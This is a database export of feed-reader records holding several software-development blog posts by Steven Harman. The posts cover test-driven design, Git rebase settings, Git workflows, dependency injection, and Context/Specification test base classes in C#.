{"subscription":{"$wrap":"$oid","v":40},"link":"http://stevenharman.net/from-testing-to-test-first-to-test-driven","title":"From Testing to Test-First to Test-Driven","published":{"$wrap":"$date","v":1336475760000,"h":"2012-05-08T11:16:00.000Z"},"starred":false,"read":false,"content":"<p>When I started writing tests, around 2005, I was stoked just to have the tests.</p><p>When I started writing tests first, around 2006, I was excited because I was<em>Doing The TDD</em>.</p><p>A couple of years later I found that writing tests was getting really painful.Painful because they were so damn hard to set up, and painful because I had towait<em>too damn long</em>(on the order of 10-15 minutes) for the test suite torun. I reacted to the pain by changing how I write my tests; I discovered mockobjects. My tests got faster, but they were still painful.</p><h3>A realization</h3><p>In 2008 I was talking with<a href=\"http://coreyhaines.com/\" title=\"The Software Journeyman\">Corey Haines</a>about test pain,object-oriented design, and“listening” to the former to influence the latter.<a href=\"http://scottbellware.com\">Scott Bellware</a>also contributed much insight, forcing me to reallythink about what I hoped to gain from writing tests.</p><p>Those conversations help to crystallized it for me: the root cause of the painwas not the tests, but the design of the code under test. I had been doingtest-<em>first development</em>, not test-<strong>driven design</strong>.</p><p>In the years since I’ve honed my technique for driving design by listening totests and I continue to seek out the ideas and experiences of other<a href=\"https://www.destroyallsoftware.com/screencasts\" title=\"Screencasts for Serious Developers\">fast test fanatics</a>.</p><p>The Ruby and Rails communities have accelerated this path for many. I wouldsay it’s not uncommon for new folks to get started where I was in 2005 or2006. What’s more exciting is the growing numbers who are starting to feelsome pain in how they test. The next step is to become more aware of thatpain; lower your pain threshold and then make it stop hurting!</p><h3>It’s a journey</h3><p>It was by no means an overnight endeavour. It literally took years of work forme to figure this out, and I’m both happy and proud to say that<em>I’m stilllearning</em>.  I hope by putting my experience out there yours can be better,faster, MOAR!</p><div class=\"feedflare\"><a href=\"http://feeds.stevenharman.net/~ff/stevenharman?a=OTDzslYdLy8:pYZcwMG1sUA:G79ilh31hkQ\"><img src=\"http://feeds.feedburner.com/~ff/stevenharman?d=G79ilh31hkQ\" border=\"0\"></img></a><a href=\"http://feeds.stevenharman.net/~ff/stevenharman?a=OTDzslYdLy8:pYZcwMG1sUA:cGdyc7Q-1BI\"><img src=\"http://feeds.feedburner.com/~ff/stevenharman?d=cGdyc7Q-1BI\" border=\"0\"></img></a><a href=\"http://feeds.stevenharman.net/~ff/stevenharman?a=OTDzslYdLy8:pYZcwMG1sUA:gIN9vFwOqvQ\"><img src=\"http://feeds.feedburner.com/~ff/stevenharman?i=OTDzslYdLy8:pYZcwMG1sUA:gIN9vFwOqvQ\" border=\"0\"></img></a><a href=\"http://feeds.stevenharman.net/~ff/stevenharman?a=OTDzslYdLy8:pYZcwMG1sUA:V_sGLiPBpWU\"><img src=\"http://feeds.feedburner.com/~ff/stevenharman?i=OTDzslYdLy8:pYZcwMG1sUA:V_sGLiPBpWU\" border=\"0\"></img></a></div><img src=\"http://feeds.feedburner.com/~r/stevenharman/~4/OTDzslYdLy8\" height=\"1\" width=\"1\"/>","author":false,"_id":{"$wrap":"$oid","v":919}}
{"k":"0000000082","o":"0000002812","v":"001"}
{"_id":920,"_uid":920,"_dt":1373729346581,"_s":"7879a9ad12c785d2ff9ebffc04726cc2"}
{"subscription":{"$wrap":"$oid","v":40},"link":"http://stevenharman.net/another-git-visualization-for-fun","title":"Another Git Repository Visualization, Just for Fun.","published":{"$wrap":"$date","v":1309556760000,"h":"2011-07-01T21:46:00.000Z"},"starred":false,"read":false,"content":"<p>I’ve created visualizations for Git repositories before – the one tracked a<a href=\"http://stevenharman.net/gain-new-insights-by-visualizing-what-youve-already-got\" title=\"Gain New Insights by Visualizing What You’ve Already Got\">product from its first commit through launch</a>. And while I still think there is some information and insight to be gleaned from such visualizations, the real reason I like to make them is… I think they’re neat.</p><p>To celebrate launching the latest incarnation of<a href=\"http://versionone.com/\" title=\"VersionOne - it's pronounced Agilé\">VersionOne</a>, I made another visualization! This one tracks all changes made in our Git repository that occurred between our last major release (in late February) right through the very last commit that made it into the<a href=\"http://www.versionone.com/release/2011/spring/\" title=\"VersionOne Spring 2011 Release\">Spring 2011 release</a>.</p><p>Wow… that really sounded like a sales pitch, didn’t it? I hate sales pitches!</p><p>Enough of that. Enjoy!</p><object width=\"560\" height=\"315\"><param name=\"movie\" value=\"http://www.youtube.com/v/fYv9XgzY9Cc?version=3&hl=en_US&rel=0\"></param><param name=\"allowFullScreen\" value=\"true\"></param><param name=\"allowscriptaccess\" value=\"always\"></param><embed src=\"http://www.youtube.com/v/fYv9XgzY9Cc?version=3&hl=en_US&rel=0\" type=\"application/x-shockwave-flash\" width=\"560\" height=\"315\" allowscriptaccess=\"always\" allowfullscreen=\"true\"></embed></object><div class=\"feedflare\"><a href=\"http://feeds.stevenharman.net/~ff/stevenharman?a=mZ8KFMzyCRc:wYw123N4eIo:G79ilh31hkQ\"><img src=\"http://feeds.feedburner.com/~ff/stevenharman?d=G79ilh31hkQ\" border=\"0\"></img></a><a href=\"http://feeds.stevenharman.net/~ff/stevenharman?a=mZ8KFMzyCRc:wYw123N4eIo:cGdyc7Q-1BI\"><img src=\"http://feeds.feedburner.com/~ff/stevenharman?d=cGdyc7Q-1BI\" border=\"0\"></img></a><a href=\"http://feeds.stevenharman.net/~ff/stevenharman?a=mZ8KFMzyCRc:wYw123N4eIo:gIN9vFwOqvQ\"><img src=\"http://feeds.feedburner.com/~ff/stevenharman?i=mZ8KFMzyCRc:wYw123N4eIo:gIN9vFwOqvQ\" border=\"0\"></img></a><a href=\"http://feeds.stevenharman.net/~ff/stevenharman?a=mZ8KFMzyCRc:wYw123N4eIo:V_sGLiPBpWU\"><img src=\"http://feeds.feedburner.com/~ff/stevenharman?i=mZ8KFMzyCRc:wYw123N4eIo:V_sGLiPBpWU\" border=\"0\"></img></a></div><img src=\"http://feeds.feedburner.com/~r/stevenharman/~4/mZ8KFMzyCRc\" height=\"1\" width=\"1\"/>","author":false,"_id":{"$wrap":"$oid","v":920}}
{"k":"0000000082","o":"0000004293","v":"001"}
{"_id":921,"_uid":921,"_dt":1373729346585,"_s":"a8268fd38002ff696a0de1bf40eac1e7"}
{"subscription":{"$wrap":"$oid","v":40},"link":"http://stevenharman.net/git-pull-with-automatic-rebase","title":"Git Pull with Automatic Rebase","published":{"$wrap":"$date","v":1307660220000,"h":"2011-06-09T22:57:00.000Z"},"starred":false,"read":false,"content":"<p>To rebase, or not to rebase - for me its not really a question. Igenerally prefer a clean, linear commit history. Why? Because merge bubbles makehistory confusing, noisy, break<code>git bisect</code>.</p><p><a href=\"https://skitch.com/stevenharman/fdhm5/y-u-no-rebase\"><img class=\"thumbnail right\" src=\"http://stevenharman.net/images/posts/y-u-no-rebase-preview.jpg\" title=\"Y U NO REBASE!?!\" alt=\"y-u-no-rebase\"></a>Don’t believe me? Check out the pretty log to the right. See allthose merge bubbles in there?<em>Eww!</em></p><h3>The Why?</h3><p>The workflow that caused those merges was as follows:</p><ol><li><code>git pull</code>(to bring local up to date)</li><li><em>hackity-hack</em></li><li><code>git commit</code></li><li><code>git pull</code></li><li><code>git push</code></li></ol><p>By default<code>git pull</code>will fetch any new commits from the remote, andthen merge any local changes in, resulting in the merge bubbles.</p><!-- more --><h3>A better approach</h3><p>I typically use the same workflow as above with one tweak. Rather than<code>gitpull</code>I use<code>git pull --rebase</code>which will fetch the remote commits,and rebase your commits on top of the new commits from the remote. This is theâ€œre-writingâ€ of history folks often talk about.</p><h3>Make it better, automatically!</h3><p>You can tell git to use rebase, rather than merge, in one of two ways, depending onyour situation.</p><figure class='code'><figcaption><span>Force all new branches to automatically use rebase</span></figcaption><div class=\"highlight\"><table><tr><td class=\"gutter\"><pre class=\"line-numbers\"><span class='line-number'>1</span></pre></td><td class='code'><pre><code class='bash'><span class='line'><span class=\"nv\">$</span>git config branch.autosetuprebase always</span></code></pre></td></tr></table></div></figure><p>You can add the<code>--global</code>switch to have all future branches, in allrepositories on this machine, behave this way.</p><figure class='code'><figcaption><span>Force existing branches to use rebase.</span></figcaption><div class=\"highlight\"><table><tr><td class=\"gutter\"><pre class=\"line-numbers\"><span class='line-number'>1</span></pre></td><td class='code'><pre><code class='bash'><span class='line'><span class=\"nv\">$</span>git config branch.*branch-name*.rebase<span class=\"nb\">true</span></span></code></pre></td></tr></table></div></figure><h3>Get more info</h3><p>Be sure to check out the<a title=\"git-config Manual Page\" href=\"http://www.kernel.org/pub/software/scm/git/docs/git-config.html\" rel=\"external\">gitman pages</a>for more info on what those options mean and when you may or may not wantto use them.</p><p>You might also want to check out my<a title=\"Git Workflows\" href=\"https://github.com/stevenharman/git-workflows\" rel=\"external\">Git Workflows repositoryon The GitHubs</a>where you can find a Keynote presentation (or PDF in the Downloads)explaining<code>git rebase</code>vs.<code>git merge</code>Complete withpictures!</p><div class=\"feedflare\"><a href=\"http://feeds.stevenharman.net/~ff/stevenharman?a=MxgqVrGbyIs:jQOuxpUYphg:G79ilh31hkQ\"><img src=\"http://feeds.feedburner.com/~ff/stevenharman?d=G79ilh31hkQ\" border=\"0\"></img></a><a href=\"http://feeds.stevenharman.net/~ff/stevenharman?a=MxgqVrGbyIs:jQOuxpUYphg:cGdyc7Q-1BI\"><img src=\"http://feeds.feedburner.com/~ff/stevenharman?d=cGdyc7Q-1BI\" border=\"0\"></img></a><a href=\"http://feeds.stevenharman.net/~ff/stevenharman?a=MxgqVrGbyIs:jQOuxpUYphg:gIN9vFwOqvQ\"><img src=\"http://feeds.feedburner.com/~ff/stevenharman?i=MxgqVrGbyIs:jQOuxpUYphg:gIN9vFwOqvQ\" border=\"0\"></img></a><a href=\"http://feeds.stevenharman.net/~ff/stevenharman?a=MxgqVrGbyIs:jQOuxpUYphg:V_sGLiPBpWU\"><img src=\"http://feeds.feedburner.com/~ff/stevenharman?i=MxgqVrGbyIs:jQOuxpUYphg:V_sGLiPBpWU\" border=\"0\"></img></a></div><img src=\"http://feeds.feedburner.com/~r/stevenharman/~4/MxgqVrGbyIs\" height=\"1\" width=\"1\"/>","author":false,"_id":{"$wrap":"$oid","v":921}}
{"k":"0000000082","o":"0000002305","v":"001"}
{"_id":922,"_uid":922,"_dt":1373729346588,"_s":"8c6932347b9a7892dbbf21a405fb3d85"}
{"subscription":{"$wrap":"$oid","v":40},"link":"http://stevenharman.net/a-handful-of-git-workflows-for-the-agilist","title":"A Handful of Git Workflows for the Agilist","published":{"$wrap":"$date","v":1281617040000,"h":"2010-08-12T12:44:00.000Z"},"starred":false,"read":false,"content":"<p>A few months back I gave<a href=\"http://www.thepathtoagility.org/\" title=\"the path to agility conference\">little talk</a>on the darling<acronymtitle=\"Source Control Management\">SCM</acronym>tool of the Open Sourceworld,<a href=\"http://git-scm.com/\" title=\"Git: the fast version control system\">Git</a>. After the conference, the organizers asked for a copyof the presentation materials I’d used - something I usually find littlevalue in as the content of a discussion is far more than just thecollateral used.</p><p>At any rate, I obliged, sent off a PDF, and have<a href=\"http://github.com/stevenharman/git-workflows\" title=\"a handful of Git workflows for the agilist\">opened the talk up</a>for others to use and improve. You can find the source (Keynotepresentation, images, etc.) on GitHub. Fork and modify the talk to yourheart’s content. ♡</p><p>Oh, and the<a href=\"http://github.com/stevenharman/git-workflows/downloads\" title=\"download the PDF version\">PDF is there</a>too.</p><p>Enjoy!</p><div class=\"feedflare\"><a href=\"http://feeds.stevenharman.net/~ff/stevenharman?a=WO11Rd6wdFw:uYiP4CwvGo4:G79ilh31hkQ\"><img src=\"http://feeds.feedburner.com/~ff/stevenharman?d=G79ilh31hkQ\" border=\"0\"></img></a><a href=\"http://feeds.stevenharman.net/~ff/stevenharman?a=WO11Rd6wdFw:uYiP4CwvGo4:cGdyc7Q-1BI\"><img src=\"http://feeds.feedburner.com/~ff/stevenharman?d=cGdyc7Q-1BI\" border=\"0\"></img></a><a href=\"http://feeds.stevenharman.net/~ff/stevenharman?a=WO11Rd6wdFw:uYiP4CwvGo4:gIN9vFwOqvQ\"><img src=\"http://feeds.feedburner.com/~ff/stevenharman?i=WO11Rd6wdFw:uYiP4CwvGo4:gIN9vFwOqvQ\" border=\"0\"></img></a><a href=\"http://feeds.stevenharman.net/~ff/stevenharman?a=WO11Rd6wdFw:uYiP4CwvGo4:V_sGLiPBpWU\"><img src=\"http://feeds.feedburner.com/~ff/stevenharman?i=WO11Rd6wdFw:uYiP4CwvGo4:V_sGLiPBpWU\" border=\"0\"></img></a></div><img src=\"http://feeds.feedburner.com/~r/stevenharman/~4/WO11Rd6wdFw\" height=\"1\" width=\"1\"/>","author":false,"_id":{"$wrap":"$oid","v":922}}
{"k":"0000000082","o":"0000002537","v":"001"}
{"_id":923,"_uid":923,"_dt":1373729346590,"_s":"e9b7809eabee7de7339a86cd3db12692"}
{"subscription":{"$wrap":"$oid","v":40},"link":"http://stevenharman.net/want-to-make-money-make-getting-paid-the-easy-part","title":"Want to Make Money? Make Getting Paid the Easy Part!","published":{"$wrap":"$date","v":1270644720000,"h":"2010-04-07T12:52:00.000Z"},"starred":false,"read":false,"content":"<p>At least half a dozen times in the past three days I’ve been so annoyedby the payment process for various goods and/or services that I eitherdidn’t purchase the thing, or had a minor meltdown after the wholeordeal was over.</p><p>Why do merchants insist on making it so damned difficult for theircustomers to get the goods?</p><h3>A few frustrating examples</h3><p>Ever been to a sporting event where the beer vendor only accept cash,has no cash-register, and yet insists on charging a partial dollaramount per unit of booze? $6.65 for a beer. Really? Just call it $7and make the math easy for everyone. Or have a cash register at eachkiosk. Or, here’s a novel idea, start accepting plastic!</p><p>Need to renew your vehicle registration? Just do it online! But beprepared to spend an extra $5 for the<em>convenience</em>of, you knowâ€¦actually giving them the money now rather than sending a check and themhaving to pay someone to physically handle the thing.</p><h3>Two simple rules for making money</h3><ol><li>If you’re selling something someone wants:<strong>make it easy for them togive you their money!</strong></li><li>If you’re selling something someone does not want:<strong>make them wantit!</strong></li></ol><div class=\"feedflare\"><a href=\"http://feeds.stevenharman.net/~ff/stevenharman?a=iiHRhXtfTnA:hrH0gmFaJtc:G79ilh31hkQ\"><img src=\"http://feeds.feedburner.com/~ff/stevenharman?d=G79ilh31hkQ\" border=\"0\"></img></a><a href=\"http://feeds.stevenharman.net/~ff/stevenharman?a=iiHRhXtfTnA:hrH0gmFaJtc:cGdyc7Q-1BI\"><img src=\"http://feeds.feedburner.com/~ff/stevenharman?d=cGdyc7Q-1BI\" border=\"0\"></img></a><a href=\"http://feeds.stevenharman.net/~ff/stevenharman?a=iiHRhXtfTnA:hrH0gmFaJtc:gIN9vFwOqvQ\"><img src=\"http://feeds.feedburner.com/~ff/stevenharman?i=iiHRhXtfTnA:hrH0gmFaJtc:gIN9vFwOqvQ\" border=\"0\"></img></a><a href=\"http://feeds.stevenharman.net/~ff/stevenharman?a=iiHRhXtfTnA:hrH0gmFaJtc:V_sGLiPBpWU\"><img src=\"http://feeds.feedburner.com/~ff/stevenharman?i=iiHRhXtfTnA:hrH0gmFaJtc:V_sGLiPBpWU\" border=\"0\"></img></a></div><img src=\"http://feeds.feedburner.com/~r/stevenharman/~4/iiHRhXtfTnA\" height=\"1\" width=\"1\"/>","author":false,"_id":{"$wrap":"$oid","v":923}}
{"k":"0000000082","o":"0000002876","v":"001"}
{"_id":924,"_uid":924,"_dt":1373729346593,"_s":"098b908f115ef134fe5fc592745abfb2"}
{"subscription":{"$wrap":"$oid","v":40},"link":"http://stevenharman.net/an-io-language-vim-plugin","title":"An Io Language Vim Plugin","published":{"$wrap":"$date","v":1297441620000,"h":"2011-02-11T16:27:00.000Z"},"starred":false,"read":false,"content":"<p>Who here doesn’t enjoy a little color in their life? I know I do, especially whenused to highlight the syntax of a language - as anyone who’s been around me whiledowning a few pints can attest!</p><h3>Learning, Io, and Vim</h3><p><a href=\"http://stevenharman.net/images/posts/io-syntax.png\"><img class=\"left\" src=\"http://stevenharman.net/images/posts/io-syntax-thumb.png\" title=\"Io Syntax Highlighting in Vim\"></a></p><p>In an attempt to feed our insatiable desire to learn, afew of us at<a title=\"VersionOne: Simplifying Software Delivery\" href=\"http://versionone.com\" rel=\"external\">VersionOne</a>are doing a book club on<a title=\"Seven Languages in Seven Weeks: A Pragmatic Guide to Learning Programming Languages\"href=\"http://www.amazon.com/gp/product/193435659X?ie=UTF8&tag=stevenharman-20&linkCode=as2&camp=1789&creative=390957&creativeASIN=193435659X\"rel=\"external\">Seven Languages in Seven Weeks</a>. We’re currently working on chapter2:<a title=\"Io Language\" href=\"http://iolanguage.com/\" rel=\"external\">Io</a>. Mycurrent favorite editor is Vim. I wanted syntax highlighting for Io, in Vim.</p><p>I found a decent Vim script to get Io syntax highlighting, and then wrote a quick<code>ftdetect</code>script to set Io-related files to use the Io syntax. Theresulting vim-io plugin is currently embedded<a title=\"vim-io: Io, for Vim!\" href=\"https://github.com/stevenharman/config/tree/master/.vim/bundle/vim-io\" rel=\"external\">in my dotfiles on the GitHubs</a>, but if there’s interest I can pull themout into a standalone plugin.</p><p>Grab it, enjoy it, fork and improve it!</p><div class=\"feedflare\"><a href=\"http://feeds.stevenharman.net/~ff/stevenharman?a=n5Q1b6Q_lL8:MemaYYjuthY:G79ilh31hkQ\"><img src=\"http://feeds.feedburner.com/~ff/stevenharman?d=G79ilh31hkQ\" border=\"0\"></img></a><a href=\"http://feeds.stevenharman.net/~ff/stevenharman?a=n5Q1b6Q_lL8:MemaYYjuthY:cGdyc7Q-1BI\"><img src=\"http://feeds.feedburner.com/~ff/stevenharman?d=cGdyc7Q-1BI\" border=\"0\"></img></a><a href=\"http://feeds.stevenharman.net/~ff/stevenharman?a=n5Q1b6Q_lL8:MemaYYjuthY:gIN9vFwOqvQ\"><img src=\"http://feeds.feedburner.com/~ff/stevenharman?i=n5Q1b6Q_lL8:MemaYYjuthY:gIN9vFwOqvQ\" border=\"0\"></img></a><a href=\"http://feeds.stevenharman.net/~ff/stevenharman?a=n5Q1b6Q_lL8:MemaYYjuthY:V_sGLiPBpWU\"><img src=\"http://feeds.feedburner.com/~ff/stevenharman?i=n5Q1b6Q_lL8:MemaYYjuthY:V_sGLiPBpWU\" border=\"0\"></img></a></div><img src=\"http://feeds.feedburner.com/~r/stevenharman/~4/n5Q1b6Q_lL8\" height=\"1\" width=\"1\"/>","author":false,"_id":{"$wrap":"$oid","v":924}}
{"k":"0000000082","o":"0000006832","v":"001"}
{"_id":925,"_uid":925,"_dt":1373729346596,"_s":"1d6b8ea54ffba1738a31583f05f04f41"}
{"subscription":{"$wrap":"$oid","v":40},"link":"http://stevenharman.net/prefer-dependency-injection-to-service-location","title":"Prefer Dependency Injection to Service Location","published":{"$wrap":"$date","v":1253888220000,"h":"2009-09-25T14:17:00.000Z"},"starred":false,"read":false,"content":"<p>There is currently a thread running over in the StructureMap Users mailing list asking<a href=\"http://groups.google.com/group/structuremap-users/browse_thread/thread/2ee1a7eab03d7f2a\">if we really need constructor injection</a>when using an Inversion of Control container. Before any one rips off on a rant let me say that I worked with<a title=\"JonKruger.com\" href=\"http://www.jonkruger.com/\" rel=\"friend met co-worker\">Jon</a>in my former life and I’m fairly certain he’s merely conducting a thought experiment, trying to sure up his own beliefs. A worthwhile exercise, if you ask me.</p><p>At any rate, I have a few points I wanted to throw out there; most of them basic and mere reiterations of the words of others, but I’m gong to do it anyhow!</p><!-- more --><h3>The question at hand</h3><p>I would encourage you to go read the full thread (it’s a quick read… 4 minutes, tops!), but knowing many of you are lazy like me, I’ll reprint Jon’s original question here.</p><p><em>Again, please go read the full thread so you have the full context.</em></p><blockquote><p>Whenever I tell people about StructureMap (or using<acronym title=\"Dependency Injection\">DI</acronym>in general), I mention that two of the benefits are that (a) StructureMap will create objects and all their dependencies for you and (b) it enables you to fake out the dependencies in a test.</p><p>Why do we need constructor injection to do this?  I can call `ObjectFactory.GetInstance()` anytime I want and it will work.  And I could leave SM configured for my tests and call `ObjectFactory.Inject()` to stub things out.</p><p>So theoretically, I wouldn’t even need constructor injection, right?</p><footer><strong>Jon Kruger</strong><cite><a href='http://groups.google.com/group/structuremap-users/browse_thread/thread/2ee1a7eab03d7f2a'>StructureMap ML_</a></cite></footer></blockquote><h3>Let’s get the jargon down</h3><p>To be clear, Jon proposing using<a href=\"http://martinfowler.com/articles/injection.html#UsingAServiceLocator\" title=\"Using a Service Locator\">Service Location</a>rather than<a href=\"http://en.wikipedia.org/wiki/Dependency_injection\" title=\"Dependency Injection\">Dependency Injection</a>.</p><p>While Service location is better than<a href=\"http://www.lostechies.com/blogs/jimmy_bogard/archive/2009/07/03/how-not-to-do-dependency-injection-in-nerddinner.aspx\">poor-man’s DI</a>, using it as suggested above is still introducing a high degree of coupling as all of these classes now have an opaque and highly concrete dependency on the container. This is effectively creating a new form of<code>Global</code>.<em>Eww!</em></p><p>The key to using Service Location within<strong>new code</strong>is to keep it tucked away in the deepest, darkest corners of your infrastructure. For example, if you’re building something on the asp.net mvc stack, you might use Service Location within a custom<code>IControllerFactory</code>to create each of your controllers.</p><p>If you’re dealing with<strong>legacy code</strong>, full of concrete dependencies, you might use Service Location as technique for teasing things apart with a goal of decreased hard coupling. In the end this may result in wholesale replacement of some modules.</p><p>When it comes to Dependency Injection and dependencies in general, I agree with<a href=\"http://blog.scottbellware.com/\" rel=\"friend met\">Scott Bellware’s</a>point of view; make your<a href=\"http://codebetter.com/blogs/scott.bellware/archive/2007/06/28/164867.aspx\" title=\"Dependency Patterns: Optional Dependencies and Primal Dependencies\">dependencies explicit& transparent</a>by requiring them in the constructor. My gut reaction is also to avoid translucent (setter-injected) dependencies as they make it harder to tell what dependencies an object will need to do its job - the shape of the object isn’t as clear as with explicit constructor dependencies.</p><h3>Feeling the friction</h3><p>I tend to be lazy and prefer to feel friction of poor design early so I can change direction quickly. For example, when a constructor gets too large it’s a signal to stop and consider<a href=\"http://butunclebob.com/ArticleS.UncleBob.PrinciplesOfOod\" title=\"Uncle Bob's Principles of Object Oriented Design\">Single Responsibility Principle, Separation of Concerns, etc</a>. In a similar vein, I don’t usually advocate use of an<a href=\"http://www.lostechies.com/blogs/joshuaflanagan/archive/2009/02/03/auto-mocking-explained.aspx\" title=\"Auto-mocking Explained\">auto-mocking container</a>. Or at least not for folks who’ve not yet acquired a strong nose for design and simplicity; the friction helps keep you on the rails.</p><p>Later in the tread Jon mentions some friction he’s been feeling when setting up the<a href=\"http://stevenharman.net/blog/archive/2009/05/27/toward-a-better-use-of-context-specification.aspx\" title=\"Toward a Better Use of Context/Specification\">context</a>of his tests (or specs). Namely he’s having to set up and inject a lot of concrete objects for interaction within his unit tests. To me this is an indication that those tests may actually be integration tests. After all, they are flexing the integration of a several modules in concert, right?</p><p>I say, call them what they are, fire up the fully configured container, and move on.</p><p>I prefer to make the implicit explicit, to be able easily see the shape of an object, and in getting forced feedback when my design starts to slip off the rails.</p><div class=\"feedflare\"><a href=\"http://feeds.stevenharman.net/~ff/stevenharman?a=x8rG8r0ITLc:j4lXx8Uz_7s:G79ilh31hkQ\"><img src=\"http://feeds.feedburner.com/~ff/stevenharman?d=G79ilh31hkQ\" border=\"0\"></img></a><a href=\"http://feeds.stevenharman.net/~ff/stevenharman?a=x8rG8r0ITLc:j4lXx8Uz_7s:cGdyc7Q-1BI\"><img src=\"http://feeds.feedburner.com/~ff/stevenharman?d=cGdyc7Q-1BI\" border=\"0\"></img></a><a href=\"http://feeds.stevenharman.net/~ff/stevenharman?a=x8rG8r0ITLc:j4lXx8Uz_7s:gIN9vFwOqvQ\"><img src=\"http://feeds.feedburner.com/~ff/stevenharman?i=x8rG8r0ITLc:j4lXx8Uz_7s:gIN9vFwOqvQ\" border=\"0\"></img></a><a href=\"http://feeds.stevenharman.net/~ff/stevenharman?a=x8rG8r0ITLc:j4lXx8Uz_7s:V_sGLiPBpWU\"><img src=\"http://feeds.feedburner.com/~ff/stevenharman?i=x8rG8r0ITLc:j4lXx8Uz_7s:V_sGLiPBpWU\" border=\"0\"></img></a></div><img src=\"http://feeds.feedburner.com/~r/stevenharman/~4/x8rG8r0ITLc\" height=\"1\" width=\"1\"/>","author":false,"_id":{"$wrap":"$oid","v":925}}
{"k":"0000000082","o":"0000007026","v":"001"}
{"_id":926,"_uid":926,"_dt":1373729346602,"_s":"e21b653a0149d83327e6741851223178"}
{"subscription":{"$wrap":"$oid","v":40},"link":"http://stevenharman.net/toward-a-better-use-of-context-specification","title":"Toward a Better Use of Context/Specification","published":{"$wrap":"$date","v":1243406520000,"h":"2009-05-27T06:42:00.000Z"},"starred":false,"read":false,"content":"<p>If you’ve hand-rolled your own<strong>Context/Specification</strong>apparatus tosupport your<del>test</del>spec-first lifestyle, you’ve likely got a baseclass that looks something like the following:</p><div><script src='https://gist.github.com/2787284.js?file=concerns.cs'></script><noscript><pre><code>public abstract class concerns{[SetUp]public virtual void setup_context(){context();}protected virtual void context() {}protected virtual void decontext() {}[TearDown]public virtual void cleanup_context(){decontext();}}</code></pre></noscript></div><p>The above is co-opting an existing unit testing tool into something morelanguage-oriented and behavior focused. In this case we’ve built upon<a href=\"http://mbunit.com/\" title=\"generative unit test framework\">MbUnit</a>, adding a couple of hook methods that are responsible for</p><ol><li>setting up the context before an individual specification -<code>context</code></li><li>optionally doing any necessary teardown after each specification –<code>decontext</code></li></ol><h3>An example</h3><p>Using this base class, we’ll end up with specs that might lookssomething like</p><div><script src='https://gist.github.com/2787284.js?file=core_module_spec.cs'></script><noscript><pre><code>using Skynet.Corepublic class when_initializing_core_module : concerns{SkynetCoreModule _core;public void context(){//we'll stub it...you know...just in casevar skynetController = stub&lt;ISkynetMasterController&gt;();_core = new SkynetCoreModule(skynetController);_core.Initialize();}[Specification]public void it_should_not_become_self_aware(){_core.should_not_have_received_the_call(x =&gt; x.InitializeAutonomousExecutionMode());}[Specification]public void it_should_default_to_human_friendly_mode(){_core.AssessHumans().should_equal(RelationshipTypes.Friendly);}// more specifications under this same context// ...}</code></pre></noscript></div><p>Here we’ve set up a common context that holds true for each ofspecifications that follow it. This is also a common pattern used in<em>classic unit testing</em>and in fixture-per-class style Test-drivenDevelopment. In fact, the only real between the above and what I’d havedone in fixture-per-class style<abbr title=\"Test-driven Development\">TDD</abbr>isthe_use_of_underscores, intention revealing names, and the contexthook method.</p><h3>Is that really any different?</h3><p>These modest cosmetics are not what differentiate Context/Specification fromother styles of test-first development. For me, the real difference is therealization that there are often many contexts under which a particularbehavior my be exercised, each producing an observable and possibly differentset of results.</p><p>With Context/Specification we’ll often have<strong>many fixtures perclass/feature/functional area</strong>of the code base. Doing this allows us to keepthe context as simple as possible and focused on the behavior being specified.I’ve found that I tend to have a single file-per-class/functional area, withany number of contexts (fixtures) in each file.</p><p>Another big distinction is that specifications should be side effect free. Aspecification is an observation about the interactions that occurred or thestate of the system after some behavior has been exercised.</p><h3>Make it explicit!</h3><p>We want small, focused contexts, yes? And we want side effect freespecifications too, yes? So why not leverage our tools to help guide usin that direction?<strong>YES!</strong></p><p>Consider the following tweak to the<code>concerns</code>base class</p><div><script src='https://gist.github.com/2787284.js?file=a_better_concerns.cs'></script><noscript><pre><code>public abstract class concerns{[FixtureSetUp]public virtual void setup_context(){context();}protected virtual void context() {}protected virtual void decontext() {}[FixtureTearDown]public virtual void cleanup_context(){decontext();}}</code></pre></noscript></div><p>Such a base class will only set up each context once, no matter how manyspecifications are made against the context. This does a couple ofthings for us</p><ul><li>requires side effect free specifications</li><li>guides us toward smaller, more focused contexts</li><li>might actually make our specs run faster!</li></ul><p>As for the<em>running faster</em>bit, that is not guaranteed as it reallydepends on how you were writing your specs before making this change.</p><h3>Some things to watch for</h3><p>If, however, you were following more of a fixture-per-class style, youmight find a drastic reduction in how long it takes your spec suite torun. The corollary is, of course, that you likely don’t have smallcontexts. That is trouble and is often an indicator that the one, largecontext is itching to be split out into two or more discrete contexts.</p><p>Upon switching your base class over to this more rigidContext/Specification pattern, you might also find that you have some –or many – broken specs. This is an indicator that those broken specswere not side effect free. Well, actually its suggesting that some ofthe sibling specs weren’t side effect free and they are now causingother specs to break.</p><h3>Notes:</h3><p>The portions of this article relating to changing from a standardcontext set up to a once-per-fixture style apply to<em>most</em>of thehand-rolled Context/Specification base classes I’ve seen in the wild.</p><p>If, however, you are using a tool like<a href=\"http://github.com/machine/machine.specifications\">MSpec</a>, then you’re in goodshape as<a href=\"http://aaron-jensen.com\">Aaron</a>applied this same philosophy out of the gate. And ifyou’re not using MSpec, I’d encourage you to take a look at it forinspiration, if nothing else.</p><div class=\"feedflare\"><a href=\"http://feeds.stevenharman.net/~ff/stevenharman?a=kMP8RZs50SE:Y6dL4nceGF4:G79ilh31hkQ\"><img src=\"http://feeds.feedburner.com/~ff/stevenharman?d=G79ilh31hkQ\" border=\"0\"></img></a><a href=\"http://feeds.stevenharman.net/~ff/stevenharman?a=kMP8RZs50SE:Y6dL4nceGF4:cGdyc7Q-1BI\"><img src=\"http://feeds.feedburner.com/~ff/stevenharman?d=cGdyc7Q-1BI\" border=\"0\"></img></a><a href=\"http://feeds.stevenharman.net/~ff/stevenharman?a=kMP8RZs50SE:Y6dL4nceGF4:gIN9vFwOqvQ\"><img src=\"http://feeds.feedburner.com/~ff/stevenharman?i=kMP8RZs50SE:Y6dL4nceGF4:gIN9vFwOqvQ\" border=\"0\"></img></a><a href=\"http://feeds.stevenharman.net/~ff/stevenharman?a=kMP8RZs50SE:Y6dL4nceGF4:V_sGLiPBpWU\"><img src=\"http://feeds.feedburner.com/~ff/stevenharman?i=kMP8RZs50SE:Y6dL4nceGF4:V_sGLiPBpWU\" border=\"0\"></img></a></div><img src=\"http://feeds.feedburner.com/~r/stevenharman/~4/kMP8RZs50SE\" height=\"1\" width=\"1\"/>","author":false,"_id":{"$wrap":"$oid","v":926}}
{"k":"0000000082","o":"0000003179","v":"001"}
